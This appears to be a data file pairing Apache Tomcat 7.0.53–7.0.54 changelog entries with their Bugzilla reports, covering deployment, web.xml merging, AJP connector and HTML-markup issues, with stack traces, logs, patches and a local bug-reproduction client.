7) Some HTML pages contain elements in a XHTML-compatible syntax, e.g. self-closing elements like ""<br />"", whereas others contain ""<br>"". Actually, when using ""<br />"" in a document that is sent using ""text/html"" (or a "".html"" file extension), this was wrong syntax according to previous HTML specifications, as only ""<br>"" syntax was allowed (even if a DOCTYPE states ""XHTML 1.0"", the browser actually uses a HTML parser instead of a XML parser when the page is sent with ""text/html"" instead of ""application/xhtml+xml""). However, the new HTML5 specification allows this syntax (<br />) in HTML documents.
  However, when a document is intended to be a polyglot document (i.e. a document that is compatible with both HTML and XML parsing modes), then there are a lot of other concerns that one needs to take care of, e.g. not to use entity references like ""&nbsp;"" as XML parsers are not guaranteed to process a external DTD (which would declare such entities), and also the HTML5 spec does not define any such DTD [5]. Furthermore, always write <input type=""checkbox"" checked=""checked"" itemscope=""itemscope"" /> instead of <input type=checkbox checked itemscope> and so on.
  However, I think it is easier to write documents that are either HTML only, or XHTML (XML) only. IE 9 is the first IE that supports XHTML, so I think, currently, a XHTML-only document is not an option here (whereas I do XHTML-only documents for my own websites, as I use a XML tool to generate the output and I don't care about IE <= 8). In this case, I think it is easier to use HTML-only syntax instead of creating a polyglot document.
  Actually, for a person that writes HTML by hand, I think it is easier to write HTML-only syntax; whereas for documents generated programatically by an XML writer, the XHTML-only syntax would fit better.
  

Please add, if I forgot something.


Now, if one is going to improve the markup of a document, I think it is a good idea to also improve the design/layout.

When I have time (and if you agree) I can start working on the things mentioned above, unless it is already done by another person ;-)

I see in the archives that Pidster already proposed a new layout for the Tomcat website [6] (which was the same layout as the ROOT index.jsp), which has not been accepted yet. I don't have another proposal for a new design of the Tomcat website atm, but I think the HTML markup can be improved (the points mentioned above) and the style can be tweaked a bit so that the site doesn't look dated.

What do you think?


[1] http://www.w3.org/TR/html5/
[2] http://wiki.whatwg.org/wiki/HTML_vs._XHTML
[3] http://www.w3.org/TR/html5/tabular-data.html#the-table-element
[4] http://hixie.ch/advocacy/xhtml
[5] http://www.w3.org/TR/html5/the-xhtml-syntax.html#writing-xhtml-documents
[6] http://markmail.org/message/og235cbvrdluiejg
[7] http://www.w3.org/TR/xml/#sec-guessing
[8] http://www.w3.org/TR/html5/document-metadata.html#attr-meta-charset
[9] http://en.wikipedia.org/wiki/Microdata_%28HTML%29"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55383
Web applications|Tomcat 7.0.54 (violetagg)|fix|56418|Ensure that the Manager web application does not report success for a web application deployment that fails. (slaurent)|Manager incorrectly reports deployment as OK even though it failed|"Created attachment 31536 [details]
Proposed patch on tomcat7 trunk

When using the Manager to deploy a webapp remotely (uploading the war with an http PUT), the deployment status is incorrectly reported.
It does not occur when deploying a WAR that is on the server filesystem.

The proposed patch factors the check for the context state."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56418
Web applications|Tomcat 7.0.54 (violetagg)|fix||Fix target and rel attributes on links in documentation. They were lost during XSLT transformation. (kkolinko)|||
Web applications|Tomcat 7.0.54 (violetagg)|update||Improve valves documentation. Split valves into groups. (kkolinko)|||
Other|Tomcat 7.0.54 (violetagg)|fix||Align DisplayName of Tomcat installed by service.bat with one installed by the *.exe installer. Print a warning in case if neither server nor client jvm is found by service.bat. (kkolinko)|||
Other|Tomcat 7.0.54 (violetagg)|update|56363|Update to version 1.1.30 of Tomcat Native library. (schultz)|OpenSSL security advisory - Heartbleed bug|"The binary builds of Tomcat Native 1.1.24 - 1.1.29 have been compiled with an OpenSSL version vulnerable to Heartbleed, and are thus probably vulnerable. See http://www.openssl.org/news/secadv_20140407.txt and http://heartbleed.com/

A new build using OpenSSL 1.0.1g would be very much appreciated."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56363
Other|Tomcat 7.0.54 (violetagg)|update||Update package renamed Apache Commons BCEL to r1593495 to pick up some additional changes for Java 7 support and some code clean up. (markt)|||
Other|Tomcat 7.0.54 (violetagg)|add||In tests: allow to configure directory where JUnit reports and access log are written to. (kkolinko)|||
Catalina|Tomcat 7.0.53 (violetagg)|add||Make it easier for applications embedding and/or extending Tomcat to modify the javaseClassLoader attribute of the WebappClassLoader. (markt)|||
Catalina|Tomcat 7.0.53 (violetagg)|fix||Improve the robustness of web application undeployment based on some code analysis triggered by the report for 54315. (markt)|Redeploying webapp causes NullPointerException in managerBase|"Created attachment 29775 [details]
Stacktrace

This only happends sometimes, and is hard to reproduce.

After undeploying and deploying a webapp, sometimes the webapp show an exception at the jps's. 

I've traced it down to ManagerBase.java - generateSessionId() method. It looks like the sessionIdGenerator is null. 

Attached stacktrace"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54315
Catalina|Tomcat 7.0.53 (violetagg)|fix|56219|Improve merging process for web.xml files to take account of the elements and attributes supported by the Servlet version of the merged file. (markt)|Failure to parse MergedWebXml in Jasper in 7.0.52 when in Strict Compliance mode for 2.5 and earlier web apps|"(Filing an issue for an already fixed bug, to better document it)

This was observed for Web Applications that
1. use Servlet 2.5 or earlier schemas/dtds in their web.xml file.
2. and have a Filter configured.

Steps to reproduce:

1. Put Tomcat 7.0.52 into ""scrict servlet compliance"" mode by adding the following line to conf/catalina.properties:

[[[
org.apache.catalina.STRICT_SERVLET_COMPLIANCE=true
]]]

2. Replace webapps/ROOT/WEB-INF/web.xml with the following text
(It is web.xml from Tomcat 6 ROOT app  plus a added a <filter>):

[[[
<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the ""License""); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an ""AS IS"" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->

<web-app xmlns=""http://java.sun.com/xml/ns/javaee""
   xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
   xsi:schemaLocation=""http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd""
   version=""2.5"">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

    <filter>
        <filter-name>setCharacterEncodingFilter</filter-name>
        <filter-class>org.apache.catalina.filters.SetCharacterEncodingFilter</filter-class>
        <init-param>
            <param-name>encoding</param-name>
            <param-value>UTF-8</param-value>
        </init-param>
    </filter>
    <filter-mapping>
        <filter-name>setCharacterEncodingFilter</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>

</web-app>
]]]

3. Start Tomcat and access a JSP page:
http://localhost:8080/index.jsp

Expected: Tomcat Welcome page.
Actual: It fails with error 500 and
[[[
org.xml.sax.SAXParseException; systemId: file:///<CATALINA HOME>/bin/org.apache.tomcat.util.scan.MergedWebXml; lineNumber: 13; columnNumber: 22; cvc-complex-type.2.4.a: Invalid content was found starting with element 'async-supported'. One of '{""http://java.sun.com/xml/ns/javaee"":init-param}' is expected.
 com.sun.org.apache.xerces.internal.util.ErrorHandlerWrapper.createSAXParseException(ErrorHandlerWrapper.java:198)
 (...)
 com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderImpl.parse(DocumentBuilderImpl.java:347)
 org.apache.jasper.xmlparser.ParserUtils.parseXMLDocument(ParserUtils.java:114)
 org.apache.jasper.compiler.JspConfig.processWebDotXml(JspConfig.java:95)
 org.apache.jasper.compiler.JspConfig.init(JspConfig.java:243)
 org.apache.jasper.compiler.JspConfig.findJspProperty(JspConfig.java:302)
 org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:114)
 org.apache.jasper.compiler.Compiler.compile(Compiler.java:373)
 org.apache.jasper.compiler.Compiler.compile(Compiler.java:353)
 org.apache.jasper.compiler.Compiler.compile(Compiler.java:340)
 org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:657)
 org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:357)
]]]


The cause is that MergedWebXml that is used to pass configuration from Tomcat (Catalina) to JSP Engine (Jasper) was generated incorrectly for the specified version.

The XML text generated for a filter had  <async-supported>false</async-supported>, but such option is available for filters only starting with Servlet 3.0


Notes:
1. The generated XML can be logged with <Context logEffectiveWebXml=""true"" />
http://tomcat.apache.org/tomcat-7.0-doc/config/context.html

2. Tomcat 6 and 8 are not affected.
Tomcat 6 does not have web.xml merging, as support for web fragments is in Servlet 3.0 and later.
Tomcat 8 uses different mechanism to pass configuration to Jasper.

Mail Threads:
http://marc.info/?t=139271851500004&r=1&w=2"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56219
Catalina|Tomcat 7.0.53 (violetagg)|fix|56190|The response should be closed (i.e. no further output is permitted) when a call to AsyncContext.complete() takes effect. (markt)|Connection keep-alive not working with asynchronous servlet|"Created attachment 31346 [details]
AsyncHelloServlet.java

I am trying to use asynchronous servlets. It looks like whenever you call request.startAsync() keep-alive is disabled and the response is sent in chunked transfer encoding.

I attached the code of a simple servlet. I get these headers in the response:
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Transfer-Encoding: chunked
Date: Wed, 26 Feb 2014 13:25:29 GMT

With a regular blocking servlet I get:
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Content-Length: 11
Date: Wed, 26 Feb 2014 13:49:17 GMT"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56190
Catalina|Tomcat 7.0.53 (violetagg)|fix|56236|Enable Tomcat to work with alternative Servlet and JSP API JARs that package the XML schemas in such as way as to require a dependency on the JSP API before enabling validation for web.xml. Tomcat has no such dependency. (markt)|tomcat cannot startup since version 6.0.39,7.0.52,8.0 on some machines.|"Created attachment 31377 [details]
error log

Dear contributor
Since I upgrade my tomcat 7.0.47 to 7.0.52. those kind of issue was found and it is still not fixed yet.
this issue was also found on latest tomcate 6 and 8 version. 

I attach the error log. please check the attachment.

this issue was also repoerted by other user but they have not report to offical site yet.

same symptom:

http://stackoverflow.com/questions/21138279/tomcat-7-50jdk-64bit-1-7-0-51-start-up-issues

http://bbs.csdn.net/topics/390705454 (Chinese version site) 

environment:

OS: Win7  (64 BIT)
JDK :JDK7 with update 51 (64 bit.)

March 09, 2014 12:12:15 AM org.apache.catalina.core.AprLifecycleListener init
INFO: The APR based Apache Tomcat Native library which allows optimal performance in production environments was not found on the java.library.path: C:\Program Files\Java\jdk1.7.0\bin;C:\server\tomcat 7\bin
March 09, 2014 12:12:15 AM org.apache.coyote.AbstractProtocol init
INFO: Initializing ProtocolHandler [""http-bio-8080""]
March 09, 2014 12:12:15 AM org.apache.coyote.AbstractProtocol init
INFO: Initializing ProtocolHandler [""ajp-bio-8009""]
March 09, 2014 12:12:15 AM org.apache.catalina.startup.Catalina load
INFO: Initialization processed in 797 ms
March 09, 2014 12:12:15 AM org.apache.catalina.core.StandardService startInternal
INFO: Starting service Catalina
March 09, 2014 12:12:15 AM org.apache.catalina.core.StandardEngine startInternal
INFO: Starting Servlet Engine: Apache Tomcat/7.0.52
March 09, 2014 12:12:15 AM org.apache.catalina.startup.HostConfig deployDirectory
INFO: Deploying web application directory C:\server\tomcat 7\webapps\docs
March 09, 2014 12:12:16 AM org.apache.catalina.startup.HostConfig deployDirectory
SEVERE: Error deploying web application directory C:\server\tomcat 7\webapps\docs
java.lang.ExceptionInInitializerError
	at org.apache.catalina.startup.ContextConfig.createWebXmlDigester(ContextConfig.java:515)
	at org.apache.catalina.startup.ContextConfig.init(ContextConfig.java:836)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:382)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:402)
	at org.apache.catalina.util.LifecycleBase.init(LifecycleBase.java:110)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:139)
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:632)
	at org.apache.catalina.startup.HostConfig.deployDirectory(HostConfig.java:1229)
	at org.apache.catalina.startup.HostConfig$DeployDirectory.run(HostConfig.java:1875)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
	at java.util.concurrent.FutureTask.run(FutureTask.java:262)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:744)
Caused by: java.lang.NullPointerException
	at org.apache.tomcat.util.descriptor.DigesterFactory.idFor(DigesterFactory.java:107)
	at org.apache.tomcat.util.descriptor.DigesterFactory.<clinit>(DigesterFactory.java:59)
	... 18 more
March 09, 2014 12:12:16 AM org.apache.catalina.startup.HostConfig deployDirectory
INFO: Deploying web application directory C:\server\tomcat 7\webapps\examples
March 09, 2014 12:12:16 AM org.apache.catalina.startup.HostConfig deployDirectory
SEVERE: Error deploying web application directory C:\server\tomcat 7\webapps\examples
java.lang.NoClassDefFoundError: Could not initialize class org.apache.tomcat.util.descriptor.DigesterFactory
	at org.apache.catalina.startup.ContextConfig.createWebXmlDigester(ContextConfig.java:515)
	at org.apache.catalina.startup.ContextConfig.init(ContextConfig.java:836)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:382)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:402)
	at org.apache.catalina.util.LifecycleBase.init(LifecycleBase.java:110)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:139)
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:632)
	at org.apache.catalina.startup.HostConfig.deployDirectory(HostConfig.java:1229)
	at org.apache.catalina.startup.HostConfig$DeployDirectory.run(HostConfig.java:1875)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
	at java.util.concurrent.FutureTask.run(FutureTask.java:262)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:744)
March 09, 2014 12:12:16 AM org.apache.catalina.startup.HostConfig deployDirectory
INFO: Deploying web application directory C:\server\tomcat 7\webapps\host-manager
March 09, 2014 12:12:16 AM org.apache.catalina.startup.HostConfig deployDirectory
SEVERE: Error deploying web application directory C:\server\tomcat 7\webapps\host-manager
java.lang.NoClassDefFoundError: Could not initialize class org.apache.tomcat.util.descriptor.DigesterFactory
	at org.apache.catalina.startup.ContextConfig.createWebXmlDigester(ContextConfig.java:515)
	at org.apache.catalina.startup.ContextConfig.init(ContextConfig.java:836)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:382)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:402)
	at org.apache.catalina.util.LifecycleBase.init(LifecycleBase.java:110)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:139)
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:632)
	at org.apache.catalina.startup.HostConfig.deployDirectory(HostConfig.java:1229)
	at org.apache.catalina.startup.HostConfig$DeployDirectory.run(HostConfig.java:1875)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
	at java.util.concurrent.FutureTask.run(FutureTask.java:262)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:744)
March 09, 2014 12:12:16 AM org.apache.catalina.startup.HostConfig deployDirectory
INFO: Deploying web application directory C:\server\tomcat 7\webapps\manager
March 09, 2014 12:12:16 AM org.apache.catalina.startup.HostConfig deployDirectory
SEVERE: Error deploying web application directory C:\server\tomcat 7\webapps\manager
java.lang.NoClassDefFoundError: Could not initialize class org.apache.tomcat.util.descriptor.DigesterFactory
	at org.apache.catalina.startup.ContextConfig.createWebXmlDigester(ContextConfig.java:515)
	at org.apache.catalina.startup.ContextConfig.init(ContextConfig.java:836)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:382)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:402)
	at org.apache.catalina.util.LifecycleBase.init(LifecycleBase.java:110)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:139)
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:632)
	at org.apache.catalina.startup.HostConfig.deployDirectory(HostConfig.java:1229)
	at org.apache.catalina.startup.HostConfig$DeployDirectory.run(HostConfig.java:1875)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
	at java.util.concurrent.FutureTask.run(FutureTask.java:262)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:744)
March 09, 2014 12:12:16 AM org.apache.catalina.startup.HostConfig deployDirectory
INFO: Deploying web application directory C:\server\tomcat 7\webapps\ROOT
March 09, 2014 12:12:16 AM org.apache.catalina.startup.HostConfig deployDirectory
SEVERE: Error deploying web application directory C:\server\tomcat 7\webapps\ROOT
java.lang.NoClassDefFoundError: Could not initialize class org.apache.tomcat.util.descriptor.DigesterFactory
	at org.apache.catalina.startup.ContextConfig.createWebXmlDigester(ContextConfig.java:515)
	at org.apache.catalina.startup.ContextConfig.init(ContextConfig.java:836)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:382)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:402)
	at org.apache.catalina.util.LifecycleBase.init(LifecycleBase.java:110)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:139)
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:632)
	at org.apache.catalina.startup.HostConfig.deployDirectory(HostConfig.java:1229)
	at org.apache.catalina.startup.HostConfig$DeployDirectory.run(HostConfig.java:1875)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
	at java.util.concurrent.FutureTask.run(FutureTask.java:262)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:744)
March 09, 2014 12:12:16 AM org.apache.coyote.AbstractProtocol start
INFO: Starting ProtocolHandler [""http-bio-8080""]
March 09, 2014 12:12:16 AM org.apache.coyote.AbstractProtocol start
INFO: Starting ProtocolHandler [""ajp-bio-8009""]
March 09, 2014 12:12:16 AM org.apache.catalina.startup.Catalina start
INFO: Server startup in 191 ms"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56236
Catalina|Tomcat 7.0.53 (violetagg)|fix|56246|Fix NullPointerException in MemoryRealm when authenticating an unknown user. (markt)|NPE in MemoryRealm when authenticating unknown user|"When using the embedded tomcat with a MemoryRealm for basic authentication, a request containing an unknown username leads to a NullPointerException.

java.lang.NullPointerException
org.apache.catalina.realm.MemoryRealm.authenticate(MemoryRealm.java:143)	org.apache.catalina.authenticator.BasicAuthenticator.authenticate(BasicAuthenticator.java:164)
....

MemoryRealm.authenticate get the principal via principals.get(username).
If the user is not known, he result is null."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56246
Catalina|Tomcat 7.0.53 (violetagg)|fix|56248|Allow the deployer to update an existing WAR file without undeploying the existing application if the update flag is set. This allows any existing custom context.xml for the application to be retained. To update an application and remove any existing context.xml simply undeploy the old version of the application before deploying the new version. (markt)|Automatic deployment with TCD deletes customized context.xml file|"I was very happy to see the changes to automatic deployment, and that customized context.xml files in conf/Catalina/localhost/<appname>.xml are preserved when a war file is replaced on the server.

However, when using the ant tasks that come with TCD (and I suspect when using the Tomcat manager, although I have not tested that), it appears that the webapp is deleted and then uploaded (as opposed to just being replaced), which is causing the customized context.xml file to be lost and replaced with a default version.

=== Reply from Mark Thomas ===

Hmm. It looks like the update command does an undeployment followed by a
deploy rather than a replacement of the WAR file and a redeploy. You
aren't going to be able to fix that without code changes to Tomcat.
Changing the behaviour seems reasonable here. I suggest you open a
bugzilla issue for this."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56248
Catalina|Tomcat 7.0.53 (violetagg)|fix||Fix CVE-2014-0096: Redefine the globalXsltFile initialisation parameter of the DefaultServlet as relative to CATALINA_BASE/conf or CATALINA_HOME/conf. Prevent user supplied XSLTs used by the DefaultServlet from defining external entities. (markt)|||
Catalina|Tomcat 7.0.53 (violetagg)|add||Add a work around for validating XML documents (often TLDs) that use just the file name to refer to the JavaEE schema on which they are based. (markt)|||
Catalina|Tomcat 7.0.53 (violetagg)|fix|56293|Cache resources loaded by the class loader from /META-INF/services/ for better performance for repeated look ups. (markt)|WebappClassLoader does not cache META-INF/services which leads to performance issues|"Since Tomcat 7.0.28, the WebappClassLoader does not cache any resources on the classpath except .class and .properties files (see https://issues.apache.org/bugzilla/show_bug.cgi?id=53081).
This leads to a massive performance problem in applications that contain .jars on the classpath that use the ServiceLoader mechanism of Java 6 to bind concrete XML readers and writers to their respective interfaces, since every time the concrete instance is loaded, the WebappClassLoader has to open the .jar to read which concrete implementation is used.
A possible solution might be that caching is enabled for all resources that reside in the META-INF/services folder."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56293
Coyote|Tomcat 7.0.53 (violetagg)|fix|53119|Make sure the NIO AJP output buffer is cleared on any error to prevent any possible overflow if it is written to again before the connection is closed. This extends the original fix for the APR/native output buffer to the NIO connector. (kkolinko)|java.nio.BufferOverflowException in AjpAprProcessor.output() when AJP client disconnects|"As reported on the users list [2] (note that I used Tomcat 7.0.27, but Bugzilla seems to have only 7.0.26):

Hi all,

some time ago, I wrote about a BufferOverflowException which I got sporadically on my Tomcat 7.0.21 [1], when using the AJP-APR-Connector.
However, at that time I couldn't reproduce the exception.

When I looked at this again today, I was able to create a client that sends an AJP message and aborts the connection, resulting in the BufferOverflowException in Tomcat. I was using Tomcat 7.0.27 with Tomcat Native 1.1.23, on Oracle JDK 1.7.0_03 and Windows 7 32-bit.


To reproduce,

1. On the server side, create a web application containing a servlet which will generate some random data:

@WebServlet(""/index.html"")
public class MyTestServlet extends HttpServlet {
    private static final long serialVersionUID = 1L;
       
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try {
            response.setContentType(""text/plain"");
            response.setCharacterEncoding(""utf-8"");
            
            byte[] bytesToWrite = {48, 49, 50, 51, 52, 53, 54, 55, 56, 57};
            
            // Try to write 1,000,000 bytes to the client.
            try (OutputStream out = response.getOutputStream()) {
                for (int i = 0; i < 100000; i++) {
                    out.write(bytesToWrite);
                }
            }
            
        } catch (IOException ex) {
            // Ignore
        }
    }
}

Deploy the application as ROOT, so that the servlet will be reachable at ""/"".
Configure Tomcat to have an AJP-APR connector listening on port 8009.


2. On the client side, create a program like this:

public class AjpTester {
    public static void main(String[] args) throws IOException {

        byte[] ajpPacketBytes = { // JK_AJP13_FORWARD_REQUEST for ""/""
            0x12, 0x34, 0x00, 0x54, 0x02, 0x02, 0x00, 0x08,
            0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31,
            0x00, 0x00, 0x01, 0x2f, 0x00, 0x00, 0x07, 0x31,
            0x2e, 0x32, 0x2e, 0x33, 0x2e, 0x34, 0x00, 0x00,
            0x07, 0x31, 0x2e, 0x32, 0x2e, 0x33, 0x2e, 0x34,
            0x00, 0x00, 0x09, 0x6c, 0x6f, 0x63, 0x61, 0x6c,
            0x68, 0x6f, 0x73, 0x74, 0x00, 0x00, 0x50, 0x00,
            0x00, 0x02, (byte)0xa0, 0x06, 0x00, 0x0a, 0x4b, 0x65,
            0x65, 0x70, 0x2d, 0x41, 0x6c, 0x69, 0x76, 0x65,
            0x00, (byte)0xa0, 0x0b, 0x00, 0x09, 0x6c, 0x6f, 0x63,
            0x61, 0x6c, 0x68, 0x6f, 0x73, 0x74, 0x00, (byte)0xff
        };

        Socket s = new Socket(""localhost"", 8009); // connect to AJP port
        OutputStream sout = s.getOutputStream();
        InputStream sin = s.getInputStream();

        sout.write(ajpPacketBytes); // request Url ""/""

        // Read between 10,000 and 11,023 bytes, then exit the JVM
        byte[] buf = new byte[1024];
        int read;
        int bytesRead = 0;
        while ((read = sin.read(buf)) > 0) {
            bytesRead += read;
            if (bytesRead >= 10000) {
                System.exit(1);
            }
        }
    }
}

The client will send an JK_AJP13_FORWARD_REQUEST message which requests URL ""/"" and sends ""Connection: keep-alive"" and ""Host: localhost"" headers.


3. Tomcat will display this exception:

Apr 20, 2012 10:57:08 PM org.apache.coyote.ajp.AjpAprProcessor process
Schwerwiegend: Error processing request
java.nio.BufferOverflowException
	at java.nio.DirectByteBuffer.put(DirectByteBuffer.java:357)
	at org.apache.coyote.ajp.AjpAprProcessor.output(AjpAprProcessor.java:285)
	at org.apache.coyote.ajp.AbstractAjpProcessor$SocketOutputBuffer.doWrite(AbstractAjpProcessor.java:1119)
	at org.apache.coyote.Response.doWrite(Response.java:504)
	at org.apache.catalina.connector.OutputBuffer.realWriteBytes(OutputBuffer.java:383)
	at org.apache.tomcat.util.buf.ByteChunk.flushBuffer(ByteChunk.java:462)
	at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:334)
	at org.apache.catalina.connector.OutputBuffer.close(OutputBuffer.java:283)
	at org.apache.catalina.connector.Response.finishResponse(Response.java:511)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:434)
	at org.apache.coyote.ajp.AjpAprProcessor.process(AjpAprProcessor.java:197)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:565)
	at org.apache.tomcat.util.net.AprEndpoint$SocketProcessor.run(AprEndpoint.java:1812)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
	at java.lang.Thread.run(Thread.java:722)


I guess the exception itself is harmless, but it may fill up log files, if clients disconnect frequently while receiving data.
Note that before that exception occurs, a regular ""ClientAbortException:  java.io.IOException: Failed to send AJP message"" is thrown by org.apache.catalina.connector.OutputBuffer.realWriteBytes(OutputBuffer.java:388).
The exception occurs neither with AJP-BIO nor with AJP-NIO.


[1] http://markmail.org/message/zogi3tfbz2kyw3jg
[2] http://markmail.org/message/ntejdw36pfhlqodr"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53119
Coyote|Tomcat 7.0.53 (violetagg)|fix|56172|Avoid possible request corruption when using the AJP NIO connector and a request is sent using more than one AJP message. Patch provided by Amund Elstad. (markt)|AjpNioProtocol sometimes corrupts (ignores) the request body|"Tomcat sometimes fails to read the request body when using the AjpNioProtocol 
connector. The symptom of this is the log message

ERROR org.apache.coyote.ajp.AjpMessage - Invalid message received with 
signature  ...

The cause of this problem is the fact that the read-method in  AjpNioProcessor may read more than the requested number of bytes, if more than one readSocket call is required.

Thus, reading of an ajp-message can also wrongly read some or all of the next message(s) (if any). Reading of the next messages will then most likely fail with a signature error, or the content will be corrupt.

This problem is unlikely to happen unless the FORWARD_REQUEST message is larger than a network packet, and there is a request body with Content-Length > 0, so that first body chunk message immediately follows the FORWARD_REQUEST message.

I have reproduced and solved this problem with Tomcat 7.0.42, but looking at the source code I believe the problem should be present in trunk as well.

Description of patch to fix the problem:

The read-method may have to make several calls to readSocket to read the
requested number of bytes. Alter the maximum bytes read per call so that 
the total bytes read is never more than requested.

Index: org/apache/coyote/ajp/AjpNioProcessor.java
===================================================================
--- org/apache/coyote/ajp/AjpNioProcessor.java  (revisjon 1570107)
+++ org/apache/coyote/ajp/AjpNioProcessor.java  (arbeidskopi)
@@ -155,7 +155,7 @@
         boolean block = blockFirstRead;

         while (read < n) {
-            res = readSocket(buf, read + pos, n, block);
+            res = readSocket(buf, read + pos, n - read, block);
             if (res > 0) {
                 read += res;
